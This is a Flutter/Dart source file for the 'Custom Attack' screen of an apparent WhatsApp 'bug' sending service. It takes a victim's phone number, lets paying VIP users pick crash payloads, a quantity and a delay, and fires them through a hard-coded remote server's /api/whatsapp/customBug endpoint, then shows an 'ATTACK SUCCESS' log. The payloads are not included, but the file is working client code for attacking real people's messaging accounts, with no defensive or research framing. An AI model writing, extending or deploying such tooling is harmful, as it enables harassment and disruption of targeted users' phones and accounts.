import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'dart:ui';

class CustomAttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listPayload;
  final String role;
  final String expiredDate;

  const CustomAttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listPayload,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<CustomAttackPage> createState() => _CustomAttackPageState();
}

class _CustomAttackPageState extends State<CustomAttackPage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final qtyController = TextEditingController(text: "5");
  final delayController = TextEditingController(text: "100");
  static const String baseUrl = "http://159.195.64.135:4000";

  // Animation controllers
  late AnimationController _buttonController;
  late AnimationController _fadeController; // Untuk dialog
  late AnimationController _entranceController; // Untuk animasi masuk halaman
  late Animation<double> _scaleAnimation;
  late Animation<double> _fadeAnimation;

  // Video controllers
  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  // State variables
  List<String> selectedBugs = [];
  String _senderType = "global"; // "global" or "private"
  bool _isSending = false;
  Map<String, String> _senderTypeLimits = {};
  
  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _initializeVideoController();
    _setSenderTypeLimits();
    _setDefaultBugs();
    
    // Entrance Animation
    _entranceController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    );
    _entranceController.forward();
  }

  void _initializeAnimations() {
    _buttonController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 150),
    );

    _scaleAnimation = Tween<double>(begin: 1.0, end: 0.95).animate(
      CurvedAnimation(parent: _buttonController, curve: Curves.easeInOut),
    );
  }

  void _setSenderTypeLimits() {
    _senderTypeLimits = {
      "global": "Max Qty: 10, Delay: 500ms (Fixed)",
      "private": "Max Qty: 200, Min Delay: 10ms",
    };
  }

  void _setDefaultBugs() {
    if (widget.listPayload.isNotEmpty) {
      selectedBugs.add(widget.listPayload[0]['bug_id']);
    }
  }

  void _initializeVideoController() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          print('Video initialization error: $error');
          if (mounted) {
            setState(() {
              _videoError = true;
            });
          }
        });
    } catch (e) {
      print('Video controller creation error: $e');
      if (mounted) {
        setState(() {
          _videoError = true;
        });
      }
    }
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d]'), '');
    if (cleaned.startsWith('0') || cleaned.length < 8) return null;
    return cleaned;
  }

  void _toggleBugSelection(String bugId) {
    setState(() {
      if (selectedBugs.contains(bugId)) {
        selectedBugs.remove(bugId);
      } else {
        selectedBugs.add(bugId);
      }
    });
  }

  Future<void> _sendCustomBug() async {
    if (_isSending) return;

    setState(() {
      _isSending = true;
    });

    _buttonController.forward().then((_) {
      _buttonController.reverse();
    });

    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;
    final qty = int.tryParse(qtyController.text) ?? 1;
    final delay = int.tryParse(delayController.text) ?? 100;

    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      setState(() {
        _isSending = false;
      });
      return;
    }

    if (selectedBugs.isEmpty) {
      _showAlert("❌ No Payload Selected", "Please select at least one payload to send.");
      setState(() {
        _isSending = false;
      });
      return;
    }

    try {
      final bugsParam = selectedBugs.join(',');
      final res = await http.get(Uri.parse("$baseUrl/api/whatsapp/customBug?key=$key&target=$target&bug=$bugsParam&qty=$qty&delay=$delay&senderType=$_senderType"));
      final data = jsonDecode(res.body);

      if (data["valid"] == false) {
        _showAlert("❌ Failed", data["message"] ?? "Failed to send custom bug.");
      } else {
        _showSuccessPopup(target, data["details"]);
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showSuccessPopup(String target, Map<String, dynamic> details) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => CustomSuccessDialog(
        target: target,
        details: details,
        onDismiss: () => Navigator.of(context).pop(),
      ),
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.8),
        elevation: 20,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(18),
          side: BorderSide(color: Colors.redAccent.withOpacity(0.5), width: 1),
        ),
        title: Text(title, style: const TextStyle(color: Colors.redAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: Colors.redAccent)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (!["vip", "owner"].contains(widget.role.toLowerCase())) {
      return _buildAccessDenied();
    }

    return Scaffold(
      backgroundColor: const Color(0xFF050510), // Deep space black
      // extendBody removed as there is no bottom nav bar
      body: Stack(
        children: [
          // 1. Background Layer (Video or Gradient)
          Positioned.fill(
            child: _videoInitialized && !_videoError
                ? VideoPlayer(_videoController)
                : Container(
                    decoration: const BoxDecoration(
                      gradient: LinearGradient(
                        colors: [Color(0xFF0F2027), Color(0xFF203A43), Color(0xFF2C5364)],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                    ),
                  ),
          ),
          
          // 2. Overlay Blur for readability
          Positioned.fill(
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
              child: Container(color: Colors.black.withOpacity(0.5)),
            ),
          ),

          // 3. Cyberpunk Grid/Particles Overlay (Optional decorative)
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Colors.cyanAccent.withOpacity(0.05),
                    Colors.purpleAccent.withOpacity(0.05),
                  ],
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                ),
              ),
            ),
          ),

          // 4. Main Content
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.all(16.0), // Standard padding
              child: Column(
                children: [
                  _buildHeaderNav(context), // New Header with Back Button
                  const SizedBox(height: 20),
                  _buildAnimatedEntrance(0, _buildUserInfoHeader()),
                  const SizedBox(height: 24),
                  _buildAnimatedEntrance(1, _buildGlassCard(child: _buildTargetInput())),
                  const SizedBox(height: 16),
                  _buildAnimatedEntrance(2, _buildGlassCard(child: _buildPayloadSelection())),
                  const SizedBox(height: 16),
                  _buildAnimatedEntrance(3, _buildGlassCard(child: _buildSenderType())),
                  const SizedBox(height: 16),
                  _buildAnimatedEntrance(4, _buildGlassCard(child: _buildQuantityDelay())),
                  const SizedBox(height: 24),
                  _buildAnimatedEntrance(5, _buildStatusIndicators()),
                  const SizedBox(height: 24),
                  _buildAnimatedEntrance(6, _buildSendButton()),
                  const SizedBox(height: 16),
                  _buildAnimatedEntrance(7, _buildFooterInfo()),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // --- Animation Helpers ---
  Widget _buildAnimatedEntrance(int index, Widget child) {
    return SlideTransition(
      position: Tween<Offset>(
        begin: const Offset(0, 0.5),
        end: Offset.zero,
      ).animate(CurvedAnimation(
        parent: _entranceController,
        curve: Interval(index * 0.1, 1.0, curve: Curves.easeOutQuart),
      )),
      child: FadeTransition(
        opacity: Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(
          parent: _entranceController,
          curve: Interval(index * 0.1, 1.0, curve: Curves.easeOut),
        )),
        child: child,
      ),
    );
  }

  // --- Widgets Components ---

  Widget _buildHeaderNav(BuildContext context) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.2)),
            ),
            child: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.cyanAccent, size: 20),
          ),
        ),
        Text(
          "CUSTOM ATTACK",
          style: TextStyle(
            color: Colors.white,
            fontSize: 20,
            fontWeight: FontWeight.bold,
            fontFamily: 'Orbitron',
            letterSpacing: 2,
            shadows: [
              Shadow(color: Colors.cyanAccent.withOpacity(0.8), blurRadius: 20),
            ]
          ),
        ),
        const SizedBox(width: 42), // Spacer for balance
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.1)),
        gradient: LinearGradient(
          colors: [
            Colors.white.withOpacity(0.05),
            Colors.white.withOpacity(0.02),
          ],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 10,
            spreadRadius: 2,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: child,
          ),
        ),
      ),
    );
  }

  Widget _buildUserInfoHeader() {
    bool isVip = widget.role.toLowerCase() == "vip";
    return Container(
      padding: const EdgeInsets.all(2), // For gradient border
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        gradient: LinearGradient(
          colors: isVip 
            ? [Colors.purpleAccent, Colors.blueAccent] 
            : [Colors.orangeAccent, Colors.redAccent],
        ),
        boxShadow: [
          BoxShadow(
            color: (isVip ? Colors.purpleAccent : Colors.orangeAccent).withOpacity(0.4),
            blurRadius: 15,
            spreadRadius: 1,
          ),
        ],
      ),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.8),
          borderRadius: BorderRadius.circular(18),
        ),
        child: Row(
          children: [
            CircleAvatar(
              radius: 24,
              backgroundColor: isVip ? Colors.purple.withOpacity(0.2) : Colors.orange.withOpacity(0.2),
              child: Icon(
                isVip ? FontAwesomeIcons.crown : FontAwesomeIcons.userShield,
                color: isVip ? Colors.purpleAccent : Colors.orangeAccent,
                size: 20,
              ),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    widget.username,
                    style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                      fontSize: 18,
                      letterSpacing: 1,
                    ),
                  ),
                  Row(
                    children: [
                      Container(
                        width: 8, height: 8,
                        decoration: const BoxDecoration(color: Colors.greenAccent, shape: BoxShape.circle),
                      ),
                      const SizedBox(width: 6),
                      Text(
                        "ONLINE • ${widget.role.toUpperCase()}",
                        style: TextStyle(
                          color: Colors.white.withOpacity(0.6),
                          fontSize: 11,
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.05),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white.withOpacity(0.1)),
              ),
              child: Column(
                children: [
                  Text("EXP", style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 8)),
                  Text(
                    widget.expiredDate.split(' ').first, // Show date only for brevity
                    style: const TextStyle(
                      color: Colors.cyanAccent,
                      fontSize: 12,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTargetInput() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: const [
            Icon(FontAwesomeIcons.crosshairs, color: Colors.cyanAccent, size: 16),
            SizedBox(width: 10),
            Text("TARGET DESIGNATION", style: TextStyle(color: Colors.cyanAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
          ],
        ),
        const SizedBox(height: 12),
        TextField(
          controller: targetController,
          style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 16),
          cursorColor: Colors.cyanAccent,
          decoration: InputDecoration(
            hintText: "e.g. +628xxxxxxxx",
            hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)),
            filled: true,
            fillColor: Colors.black.withOpacity(0.3),
            enabledBorder: OutlineInputBorder(
              borderSide: BorderSide(color: Colors.cyanAccent.withOpacity(0.3)),
              borderRadius: BorderRadius.circular(12),
            ),
            focusedBorder: OutlineInputBorder(
              borderSide: const BorderSide(color: Colors.cyanAccent, width: 2),
              borderRadius: BorderRadius.circular(12),
            ),
            prefixIcon: const Icon(FontAwesomeIcons.phone, color: Colors.white54, size: 18),
            suffixIcon: IconButton(
              icon: const Icon(FontAwesomeIcons.paste, color: Colors.white54, size: 16),
              onPressed: () async {
                 final data = await Clipboard.getData('text/plain');
                 if(data?.text != null) targetController.text = data!.text!;
              },
            )
          ),
        ),
      ],
    );
  }

  Widget _buildPayloadSelection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Row(
              children: const [
                Icon(FontAwesomeIcons.bug, color: Colors.purpleAccent, size: 16),
                SizedBox(width: 10),
                Text("PAYLOAD INJECTION", style: TextStyle(color: Colors.purpleAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
              ],
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                color: Colors.purple.withOpacity(0.2),
                borderRadius: BorderRadius.circular(4),
              ),
              child: Text("${selectedBugs.length} ACTIVE", style: const TextStyle(color: Colors.purpleAccent, fontSize: 10)),
            )
          ],
        ),
        const SizedBox(height: 16),
        Wrap(
          spacing: 8,
          runSpacing: 10,
          children: widget.listPayload.map((bug) {
            final bugId = bug['bug_id'];
            final bugName = bug['bug_name'];
            final isSelected = selectedBugs.contains(bugId);

            return AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              child: InkWell(
                onTap: () => _toggleBugSelection(bugId),
                borderRadius: BorderRadius.circular(20),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                  decoration: BoxDecoration(
                    color: isSelected ? Colors.purpleAccent.withOpacity(0.2) : Colors.black.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(
                      color: isSelected ? Colors.purpleAccent : Colors.white.withOpacity(0.1),
                      width: isSelected ? 1.5 : 1,
                    ),
                    boxShadow: isSelected ? [
                      BoxShadow(color: Colors.purpleAccent.withOpacity(0.3), blurRadius: 8, spreadRadius: 0)
                    ] : [],
                  ),
                  child: Text(
                    bugName,
                    style: TextStyle(
                      color: isSelected ? Colors.white : Colors.white60,
                      fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
                      fontSize: 12,
                    ),
                  ),
                ),
              ),
            );
          }).toList(),
        ),
      ],
    );
  }

  Widget _buildSenderType() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: const [
            Icon(FontAwesomeIcons.networkWired, color: Colors.blueAccent, size: 16),
            SizedBox(width: 10),
            Text("CONNECTION PROTOCOL", style: TextStyle(color: Colors.blueAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
          ],
        ),
        const SizedBox(height: 16),
        Row(
          children: [
            _buildSenderOption("global", "GLOBAL SERVER", FontAwesomeIcons.globe),
            const SizedBox(width: 12),
            _buildSenderOption("private", "PRIVATE NODE", FontAwesomeIcons.userSecret),
          ],
        ),
      ],
    );
  }

  Widget _buildSenderOption(String value, String label, IconData icon) {
    final isSelected = _senderType == value;
    final color = isSelected ? (value == "global" ? Colors.blueAccent : Colors.purpleAccent) : Colors.grey;
    
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _senderType = value),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: isSelected ? color.withOpacity(0.15) : Colors.transparent,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: isSelected ? color : Colors.white.withOpacity(0.1),
              width: 1.5,
            ),
          ),
          child: Column(
            children: [
              Icon(icon, color: color, size: 20),
              const SizedBox(height: 8),
              Text(label, style: TextStyle(color: color, fontWeight: FontWeight.bold, fontSize: 12)),
              const SizedBox(height: 4),
              Text(
                _senderTypeLimits[value]!,
                style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9),
                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildQuantityDelay() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: const [
            Icon(FontAwesomeIcons.slidersH, color: Colors.greenAccent, size: 16),
            SizedBox(width: 10),
            Text("ATTACK PARAMETERS", style: TextStyle(color: Colors.greenAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
          ],
        ),
        const SizedBox(height: 16),
        Row(
          children: [
            Expanded(
              child: _buildParamField(qtyController, "QTY", "Amount", false),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _buildParamField(delayController, "DELAY", "ms", _senderType == "global"),
            ),
          ],
        ),
         if (_senderType == "global")
            Padding(
              padding: const EdgeInsets.only(top: 8.0),
              child: Text(
                "* Global delay is locked by server",
                style: TextStyle(color: Colors.blueAccent.withOpacity(0.7), fontSize: 10, fontStyle: FontStyle.italic),
              ),
            ),
      ],
    );
  }

  Widget _buildParamField(TextEditingController ctrl, String label, String suffix, bool disabled) {
    return Container(
      decoration: BoxDecoration(
        color: disabled ? Colors.white.withOpacity(0.05) : Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: disabled ? Colors.transparent : Colors.greenAccent.withOpacity(0.3)),
      ),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      child: TextField(
        controller: ctrl,
        enabled: !disabled,
        keyboardType: TextInputType.number,
        style: TextStyle(color: disabled ? Colors.grey : Colors.white, fontFamily: 'ShareTechMono'),
        decoration: InputDecoration(
          border: InputBorder.none,
          labelText: label,
          labelStyle: TextStyle(color: disabled ? Colors.grey : Colors.greenAccent),
          suffixText: suffix,
          suffixStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10),
        ),
      ),
    );
  }

  Widget _buildStatusIndicators() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
      children: [
        _statusBadge("SERVER", true, Colors.blueAccent),
        _statusBadge("DATABASE", true, Colors.purpleAccent),
        _statusBadge("SECURITY", true, Colors.greenAccent),
      ],
    );
  }

  Widget _statusBadge(String label, bool active, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: color.withOpacity(0.1),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Container(
            width: 6, height: 6,
            decoration: BoxDecoration(
              color: color,
              shape: BoxShape.circle,
              boxShadow: [BoxShadow(color: color, blurRadius: 6)],
            ),
          ),
          const SizedBox(width: 8),
          Text(label, style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    return ScaleTransition(
      scale: _scaleAnimation,
      child: Container(
        height: 60,
        width: double.infinity,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          gradient: LinearGradient(
            colors: _isSending 
              ? [Colors.grey[800]!, Colors.grey[700]!] 
              : [Colors.cyan, Colors.blueAccent],
          ),
          boxShadow: [
            if (!_isSending)
              BoxShadow(
                color: Colors.cyan.withOpacity(0.5),
                blurRadius: 20,
                spreadRadius: 1,
              )
          ],
        ),
        child: ElevatedButton(
          onPressed: _isSending ? null : _sendCustomBug,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.transparent,
            shadowColor: Colors.transparent,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
          ),
          child: _isSending
              ? const CircularProgressIndicator(color: Colors.white)
              : Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: const [
                    Icon(FontAwesomeIcons.rocket, color: Colors.white),
                    SizedBox(width: 12),
                    Text(
                      "INITIATE ATTACK",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 16,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
        ),
      ),
    );
  }

  Widget _buildFooterInfo() {
    return Center(
      child: Text(
        "SECURE ENCRYPTED CONNECTION • VLOIDZONE",
        style: TextStyle(
          color: Colors.white.withOpacity(0.3),
          fontSize: 10,
          fontFamily: 'ShareTechMono',
          letterSpacing: 1,
        ),
      ),
    );
  }

  Widget _buildAccessDenied() {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(FontAwesomeIcons.lock, color: Colors.red, size: 60),
            const SizedBox(height: 20),
            const Text("ACCESS DENIED", style: TextStyle(color: Colors.red, fontFamily: 'Orbitron', fontSize: 24, fontWeight: FontWeight.bold)),
            const SizedBox(height: 10),
            Text("VIP Only", style: TextStyle(color: Colors.white.withOpacity(0.5))),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _buttonController.dispose();
    _entranceController.dispose();
    _videoController.dispose();
    targetController.dispose();
    qtyController.dispose();
    delayController.dispose();
    super.dispose();
  }
}

// Custom Success Dialog with improved visuals
class CustomSuccessDialog extends StatefulWidget {
  final String target;
  final Map<String, dynamic> details;
  final VoidCallback onDismiss;

  const CustomSuccessDialog({
    super.key,
    required this.target,
    required this.details,
    required this.onDismiss,
  });

  @override
  State<CustomSuccessDialog> createState() => _CustomSuccessDialogState();
}

class _CustomSuccessDialogState extends State<CustomSuccessDialog> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _scaleAnimation;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(vsync: this, duration: const Duration(milliseconds: 400));
    _scaleAnimation = CurvedAnimation(parent: _controller, curve: Curves.elasticOut);
    _controller.forward();
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: _scaleAnimation,
      child: Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: const Color(0xFF101018),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: Colors.greenAccent, width: 2),
            boxShadow: [
              BoxShadow(color: Colors.greenAccent.withOpacity(0.3), blurRadius: 20),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: Colors.greenAccent.withOpacity(0.1),
                  shape: BoxShape.circle,
                ),
                child: const Icon(FontAwesomeIcons.check, color: Colors.greenAccent, size: 40),
              ),
              const SizedBox(height: 20),
              const Text(
                "ATTACK SUCCESS",
                style: TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontSize: 18, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: Colors.black,
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Column(
                  children: [
                    _row("Target", widget.target),
                    const Divider(color: Colors.white12),
                    _row("Type", widget.details["senderType"]),
                    _row("Qty", widget.details["qty"].toString()),
                    _row("Delay", "${widget.details["delay"]}ms"),
                  ],
                ),
              ),
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: widget.onDismiss,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.greenAccent,
                    foregroundColor: Colors.black,
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                  child: const Text("CLOSE LOG", style: TextStyle(fontWeight: FontWeight.bold)),
                ),
              )
            ],
          ),
        ),
      ),
    );
  }

  Widget _row(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label, style: const TextStyle(color: Colors.grey, fontSize: 12)),
          Text(value, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 13)),
        ],
      ),
    );
  }
}